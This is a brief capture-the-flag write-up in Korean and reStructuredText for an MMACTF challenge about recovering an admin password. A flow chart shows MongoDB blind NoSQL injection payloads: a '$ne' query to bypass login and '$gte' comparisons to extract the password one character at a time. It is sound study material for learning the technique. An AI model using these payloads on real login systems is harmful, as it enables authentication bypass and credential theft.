================================================================================================================
[MMACTF] Get the admin password
================================================================================================================

Flow Chart
================================================================================================================

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8 -> step10 -> step12;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9 -> step11 -> step13;
        }
        step0 -> step1[label="user=admin&password[$ne]=1",arrowhead="normal"];
        step3 -> step2[label="login success",arrowhead="normal"];
        step4 -> step5[label="user=admin&password[$gte]=T",arrowhead="normal"];
        step7 -> step6[label="login success",arrowhead="normal"];
        step8 -> step9[label="user=admin&password[$gte]=U",arrowhead="normal"];
        step10 -> step11[label="login fail",arrowhead="normal"];

    }

|

Source analysis
================================================================================================================

MongoDB와 같은 NoSQL에 대한 Blind Injection 입니다.
$ne 연산자를 통해 취약점 존재를 확인하고, $gte 연산자를 이용하여 무작위 대입을 진행하여 true/false를 확인합니다.